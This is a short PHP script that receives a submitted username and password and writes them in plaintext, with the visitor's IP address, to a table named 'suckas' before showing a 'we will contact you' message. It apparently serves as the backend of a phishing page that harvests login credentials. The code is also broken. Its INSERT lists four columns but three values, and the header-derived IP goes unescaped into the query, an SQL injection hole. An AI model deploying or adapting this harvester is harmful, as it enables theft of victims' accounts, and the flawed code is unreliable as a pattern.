<?php 
require_once("config.php");
if((isset($_POST['your_username'])&& $_POST['your_username'] !='') && (isset($_POST['your_password'])&& $_POST['your_password'] !=''))
{
//require_once("contact_mail.php");
$yourName = $conn->real_escape_string($_POST['your_username']);
$yourPassword = $conn->real_escape_string($_POST['your_password']);
$yourIPaddress = $conn->real_escape_string($_POST['your_ipaddress']);

if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }

$sql="INSERT INTO suckas (username, password, ip_address, computer_name) VALUES ('".$yourName."','".$yourPassword."', '".$ip."')";


if(!$result = $conn->query($sql)){
die('There was an error running the query [' . $conn->error . ']');
}
else
{
echo "Thank you! We will contact you soon";
}
}
else
{
echo "Please fill Name and Email";
}

?>